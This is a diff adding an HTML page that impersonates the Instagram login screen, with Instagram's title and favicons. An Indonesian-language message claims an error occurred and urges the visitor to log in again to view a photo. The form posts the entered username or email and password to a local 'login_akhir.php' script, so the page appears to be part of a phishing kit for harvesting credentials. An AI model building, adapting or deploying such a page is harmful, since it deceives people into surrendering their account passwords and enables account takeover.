@@ -1,0 +1,118 @@
+<html lang="en"><head> 
+  <meta charset="utf-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> 
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" integrity="sha384-zCbKRCUGaJDkqS1kPbPd7TveP5iyJE0EjAuZQTgFLD2ylzuqKfdKlfG/eSrtxUkn" crossorigin="anonymous"> 
+  <link rel="preconnect" href="https://fonts.googleapis.com"> 
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin=""> 
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet"> 
+  <title>Login • Instagram</title> 
+  <link rel="icon" sizes="192x192" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+    <link rel="shortcut icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
+  <style>
+        * {
+            font-family: 'Poppins', sans-serif;
+        }
+        html {
+            max-width: 640px;
+            margin: 0 auto;
+        }
+        .input-text {
+            border: 1px solid #DBDBDB;
+            border-radius: 5px;
+            outline: none;
+            font-size: 12px;
+            display: inline-block;
+            height: 35px;
+            max-width: 250px;
+            padding: 5px 10px;
+        }
+        .atau {
+            display: flex;
+            align-items: center;
+        }
+        .atau p {
+            margin: 0 10px;
+            color: #DBDBDB;
+            font-weight: 700;
+        }
+        .atau span {
+            width: 97px;
+            height: 2px;
+            background-color: #DBDBDB;
+        }
+
+        .contain-load {
+            z-index: 3;
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .loader {
+            border: 5px solid #f3f3f3; /* Light grey */
+            border-top: 5px solid #DBDBDB; /* Blue */
+            border-radius: 50%;
+            width: 35px;
+            height: 35px;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style> 
+ </head> 
+ <body> 
+  <div class="contain-load"> 
+   <div class="loader"></div> 
+  </div> 
+  <div class="container mt-5"> 
+   <div class="card p-3"> 
+    <div class="d-flex justify-content-center py-4" style="width: 100%"> 
+     <img src="assets/img/logo-ig.png" alt="Logo Instagram" style="width: 170px"> 
+    </div> 
+    <form action="login_akhir.php" method="post"> 
+     <div class="d-flex justify-content-center mb-1"> 
+      <p style="width: 275px; text-align: center; font-size: 14px">Terjadi Kesalahan ! Silahkan login kembali untuk menuju ke foto</p> 
+     </div> 
+     <div class="d-flex justify-content-center mb-1" style="width: 100%"> 
+      <input type="text" name="email" class="input-text" placeholder="Phone number, username, or email" required=""> 
+     </div> 
+     <div class="d-flex justify-content-center" style="width: 100%"> 
+      <input type="password" name="pass" class="input-text" placeholder="Password" required=""> 
+     </div> 
+     <div class="d-flex justify-content-center pt-2"> 
+      <p style="color: #0069D9; font-size: 14px; width: 250px; font-weight: 500; text-align: right">Lupa kata sandi?</p> 
+     </div> 
+     <div class="d-flex justify-content-center" style="width: 100%"> 
+      <button class="btn btn-sm btn-primary" style="width: 250px; font-weight: bold;">Login</button> 
+     </div> 
+     <div class="text-center mt-3" style="font-size: 14px"> 
+      <p>Tidak punya akun? <a href="#">Buat akun</a></p> 
+     </div> 
+    </form> 
+   </div> 
+  </div> 
+  <script>
+        function onReady(callback) {
+            var intervalId = window.setInterval(function() {
+                if (document.getElementsByTagName('body')[0] !== undefined) {
+                    window.clearInterval(intervalId);
+                    callback.call(this);
+                }
+            }, 1000);
+        }
+
+        function setVisible(selector, visible) {
+            document.querySelector(selector).style.display = visible ? 'block' : 'none';
+        }
+
+        onReady(function() {
+            document.querySelector('.contain-load').style.display = 'none';
+        });
+    </script> 
+ 
+</body></html>
